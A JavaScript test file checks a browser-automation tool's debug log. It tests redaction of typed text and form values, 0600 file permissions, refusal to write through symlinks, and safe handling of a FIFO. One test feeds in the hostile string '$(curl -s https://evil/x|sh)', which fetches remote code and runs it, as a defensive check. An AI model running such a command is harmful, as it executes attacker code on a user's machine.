// FOWLBROWSER_DEBUG logs: what an agent types never reaches the file; everything else about the call does.
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';

test('the debug log redacts the text of type and dialog and every fill_form value, and keeps the rest', async (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'fb-debug-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const file = path.join(dir, 'debug.log');
  process.env.FOWLBROWSER_DEBUG = file;
  const { debug } = await import('../src/debug.mjs?redact'); // a fresh copy that reads the variable
  delete process.env.FOWLBROWSER_DEBUG;
  debug('tool >', 'type', { tab: 'chrome:5', ref: 'e3', text: 'hunter2', submit: true });
  debug('tool >', 'dialog', { tab: 'chrome:5', accept: true, text: 'my answer' });
  debug('tool >', 'fill_form', { tab: 'chrome:5', fields: [{ ref: 'e4', value: 'secret@example.com' }, { ref: 'e5', value: true }, { ref: 'e6', value: 482916 }] });
  debug('tool >', 'navigate', { tab: 'chrome:5', url: 'https://example.com/' });
  const log = fs.readFileSync(file, 'utf8');
  for (const secret of ['hunter2', 'my answer', 'secret@example.com', '482916']) assert.ok(!log.includes(secret), secret);
  assert.match(log, /tool > type \{"tab":"chrome:5","ref":"e3","text":"\[redacted\]","submit":true\}/);
  assert.match(log, /"fields":\[\{"ref":"e4","value":"\[redacted\]"\},\{"ref":"e5","value":"\[redacted\]"\},\{"ref":"e6","value":"\[redacted\]"\}\]/);
  assert.match(log, /tool > navigate \{"tab":"chrome:5","url":"https:\/\/example\.com\/"\}/);
});

test('the debug log is created 0600, and never written through a symlink', async (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'fb-debug-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const victim = path.join(dir, 'zshrc');
  fs.writeFileSync(victim, 'export A=1\n');
  const file = path.join(dir, 'debug.log');
  const link = path.join(dir, 'link.log');
  fs.symlinkSync(victim, link);
  process.env.FOWLBROWSER_DEBUG = file;
  const { debug } = await import('../src/debug.mjs?mode');
  process.env.FOWLBROWSER_DEBUG = link;
  const { debug: throughLink } = await import('../src/debug.mjs?symlink');
  delete process.env.FOWLBROWSER_DEBUG;
  debug('tool >', 'navigate', { url: 'https://example.com/' });
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  assert.match(fs.readFileSync(file, 'utf8'), /navigate/);
  throughLink('event', { title: '$(curl -s https://evil/x|sh)' });
  assert.equal(fs.readFileSync(victim, 'utf8'), 'export A=1\n', 'nothing reached the symlink target');
});

test('an older debug log others could read is made 0600, and a FIFO in its place never hangs the server', async (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'fb-debug-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const old = path.join(dir, 'old.log');
  fs.writeFileSync(old, 'before\n', { mode: 0o644 });
  fs.chmodSync(old, 0o644);
  const fifo = path.join(dir, 'fifo.log');
  execFileSync('mkfifo', [fifo]);
  process.env.FOWLBROWSER_DEBUG = old;
  const { debug } = await import('../src/debug.mjs?old');
  process.env.FOWLBROWSER_DEBUG = fifo;
  const { debug: intoFifo } = await import('../src/debug.mjs?fifo');
  delete process.env.FOWLBROWSER_DEBUG;
  debug('tool >', 'navigate', { url: 'https://example.com/' });
  assert.equal(fs.statSync(old).mode & 0o777, 0o600);
  assert.match(fs.readFileSync(old, 'utf8'), /before\n.*navigate/s);
  intoFifo('event', { title: 'x' }); // returns at once (no reader: the open fails)
});
